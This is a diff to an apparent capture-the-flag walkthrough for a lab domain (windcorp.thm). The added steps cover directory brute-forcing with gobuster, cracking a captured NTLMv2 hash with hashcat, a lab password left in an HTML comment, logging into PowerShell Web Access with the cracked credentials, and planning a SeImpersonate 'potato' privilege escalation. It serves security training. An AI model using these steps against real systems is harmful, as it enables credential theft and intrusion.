@@ -580,12 +580,28 @@ Here we got an hint as the first flag, that suggest us that probably the DNS ser
 ## Find the key
 Then I proceeded to directory brute-forcing to find other resources:
 
-    gobuster dir -u https://selfservice.dev.windcorp.thm  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -k
+    gobuster dir -u https://selfservice.dev.windcorp.thm  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -k
     ....
     /backup               (Status: 301) [Size: 167] [--> https://selfservice.dev.windcorp.thm/backup/]
     /Backup               (Status: 301) [Size: 167] [--> https://selfservice.dev.windcorp.thm/Backup/]
     /*checkout*           (Status: 400) [Size: 3420]
     ...
+
+    gobuster dir -u https://fire.windcorp.thm  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -k
+          ....
+          /img                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/img/]
+          /css                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/css/]
+          /vendor               (Status: 301) [Size: 156] [--> https://fire.windcorp.thm/vendor/]
+          /IMG                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/IMG/]
+          /*checkout*           (Status: 400) [Size: 3420]
+          /CSS                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/CSS/]
+          /Img                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/Img/]
+          /*docroot*            (Status: 400) [Size: 3420]
+          ...
+          /powershell           (Status: 302) [Size: 165] [--> /powershell/default.aspx?ReturnUrl=%2fpowershell]
+          ...
+So Windows PowerShell Web Access is configured on fire.windcorp.thm. This tool will come in handy later.
+
 
 Visiting the backup URI we can see:
 
@@ -803,6 +819,40 @@ Then in responder we get NTLMv2 hash for edwardle user:
           [HTTP] NTLMv2 Username : WINDCORP\edwardle
           [HTTP] NTLMv2 Hash     : edwardle::WINDCORP:09a5ba22adff963c:...740068006D000000000000000000      
 
-  
+  Next strp is trying to reverse the hash to gain a password:
+
+          sudo hashcat -m 5600 -a 0 edwardle /usr/share/wordlists/rockyou.txt
+          ...
+          EDWARDLE::WINDCORP:09a5ba22adff963c...00000000000:!xxxxxxx!
+                                                          
+          Session..........: hashcat
+          Status...........: Cracked
+          ...
+<!-- !Angelus25! -->
+
+<b>Note that Ra2 IP is changed again</b>
+With newly discovered credentials I tried to login to
+
+          https://selfservice.windcorp.thm/
+
+But after the login another undercostruction message appears. Tried RDP but the user is not be allowed to login to the computer. Since winrm is not enabled the last option is to try to use Windows PowerShell Web Access:
+
+          https://fire.windcorp.thm/powershell/en-US/logon.aspx?ReturnUrl=%2fpowershell
+
+Insert EDWARDLE credentials, as computer name insertt fire.windcorp.thm. Once logged in I found a cmd script in the user document folder that start IE. The script seems not to be scheduled, at least not running often (I modified the content inserting a command to create a new file in the same directory, but the file was never created). So it seems not to be the way to escalate our privileges.
+Then I checked our current privileges:
+
+          whoami /all
+          ...
+          Privilege Name                Description                               State  
+          ============================= ========================================= =======
+          SeMachineAccountPrivilege     Add workstations to domain                Enabled
+          SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+          SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+          ...
+          
+Since SeImpersonatePrivilege is enabled we can use some potatoes to try to escalate our privileges
+          
+
 
     
